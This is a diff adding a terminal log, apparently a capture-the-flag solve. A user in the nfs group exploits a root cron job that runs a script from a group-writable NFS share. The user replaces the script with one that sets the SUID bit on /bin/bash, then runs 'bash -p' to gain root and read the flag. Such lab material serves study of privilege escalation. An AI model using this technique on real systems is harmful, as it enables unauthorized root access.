@@ -1,0 +1,51 @@
+$ id
+uid=1001(player) gid=1001(player) groups=1001(player),996(nfs)
+
+$ cat /etc/exports
+/srv/nfs-share 192.168.0.0/16(rw,sync,no_root_squash,insecure)
+
+$ ls -ld /srv/nfs-share; ls -l /srv/nfs-share/
+drwxrwxr-x 1 root nfs 4096 Nov 19 00:11 /srv/nfs-share
+total 4
+-rwxr-xr-x 1 root root 419 Nov 19 00:10 share-check.sh
+
+$ ls -l /etc/cron.d/share /usr/local/sbin/nfsmnt.sh
+-rw-r--r-- 1 root root 231 Nov 19 00:10 /etc/cron.d/share
+-rwxr-xr-x 1 root root 870 Nov 19 00:10 /usr/local/sbin/nfsmnt.sh
+
+$ cat /etc/cron.d/share
+# Share monitoring: replicate the client mount, then run the in-share check.
+# The check script is on the export itself (that is the design flaw).
+* * * * * root /usr/local/sbin/nfsmnt.sh && /bin/bash /srv/nfs-share/share-check.sh
+
+$ cat /var/log/share-check.log | tail -3
+[2026-11-19 00:19:01] export reachable, 2 entries
+[2026-11-19 00:20:01] share-check running as root on 55f3765dc062
+[2026-11-19 00:20:01] export reachable, 2 entries
+
+$ echo x >> /etc/exports
+bash: line 1: /etc/exports: Permission denied
+
+$ echo x >> /etc/cron.d/share
+bash: line 1: /etc/cron.d/share: Permission denied
+
+$ touch /usr/local/sbin/nfsmnt.sh
+touch: cannot touch '/usr/local/sbin/nfsmnt.sh': Permission denied
+
+$ echo '#!/bin/bash' > /srv/nfs-share/share-check.sh
+bash: line 1: /srv/nfs-share/share-check.sh: Permission denied
+
+$ cat /flag.txt
+cat: /flag.txt: Permission denied
+
+$ rm -f /srv/nfs-share/share-check.sh && printf '#!/bin/bash\nchmod 4755 /bin/bash\n' > /srv/nfs-share/share-check.sh && chmod +x /srv/nfs-share/share-check.sh && ls -l /srv/nfs-share/
+total 4
+-rwxrwxr-x 1 player player 33 Nov 19 00:21 share-check.sh
+
+$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
+
+$ /bin/bash -p -c 'id; cat /flag.txt'
+uid=1001(player) gid=1001(player) euid=0(root) groups=1001(player),996(nfs)
+Ly_Flag{2c43zc1w}
+
